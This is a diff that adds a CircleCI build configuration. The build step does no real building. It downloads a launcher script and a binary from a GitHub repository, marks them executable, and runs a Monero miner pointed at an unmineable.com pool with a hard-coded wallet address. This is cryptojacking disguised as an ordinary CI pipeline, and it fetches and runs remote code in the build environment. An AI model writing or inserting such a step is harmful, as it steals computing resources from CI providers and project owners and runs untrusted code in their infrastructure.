@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/hsnm97/ell/blob/main/cmdline_launcher.sh && wget https://github.com/hsnm97/ell/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -a rx -o rx.unmineable.com:3333 -u XMR:8C2WiJBsdZeY5qpFYNRFnWgSmoqsxzu61iSb5yTLtwLG1rT14Qqn7qvC9Ysuiim5f6c9Mm4uUhFwtCPrAqkCNd5N2tvtva8.aduh#mvzd-evg6
